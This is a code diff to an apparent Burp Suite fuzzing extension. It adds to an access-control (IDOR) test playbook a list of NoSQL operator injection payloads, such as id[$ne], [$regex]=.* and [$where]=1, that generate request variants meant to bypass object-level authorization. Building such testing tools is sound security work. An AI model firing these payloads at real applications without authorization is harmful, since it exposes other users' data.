@@ -80,6 +80,32 @@ public class ParameterPollutionPlaybook implements IdorPlaybook {
                 com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(base, idx0, authorized),
                 idx1, target);
             variants.add(new IdorRequestVariant(idx0 + "=" + authorized + "&" + idx1 + "=" + target, targetRequest.withPath(at)));
+
+            // NoSQL operator injection via bracket-notation query params.
+            // MongoDB/Mongoose parse id[$ne]=value as {id: {$ne: value}}.
+            record NosqlOp(String op, String value, String desc) {}
+            List<NosqlOp> nosqlOps = List.of(
+                new NosqlOp("[$ne]", authorized, "$ne authorized (returns everything else)"),
+                new NosqlOp("[$ne]", target, "$ne target"),
+                new NosqlOp("[$gt]", "", "$gt empty (greater than nothing = all)"),
+                new NosqlOp("[$gte]", "", "$gte empty"),
+                new NosqlOp("[$lt]", "zzzzzzz", "$lt high value"),
+                new NosqlOp("[$regex]", ".*", "$regex match all"),
+                new NosqlOp("[$regex]", target, "$regex target"),
+                new NosqlOp("[$in][0]", target, "$in target"),
+                new NosqlOp("[$in][0]", authorized, "$in authorized"),
+                new NosqlOp("[$nin][0]", authorized, "$nin authorized (not-in = target)"),
+                new NosqlOp("[$exists]", "true", "$exists true"),
+                new NosqlOp("[$where]", "1", "$where truthy")
+            );
+            for (NosqlOp op : nosqlOps) {
+                String nosqlPath = com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(
+                    stripped, parameterName + op.op(), op.value());
+                variants.add(new IdorRequestVariant(
+                    parameterName + op.op() + "=" + op.value() + " (" + op.desc() + ")",
+                    targetRequest.withPath(nosqlPath)
+                ));
+            }
         }
         return variants;
     }
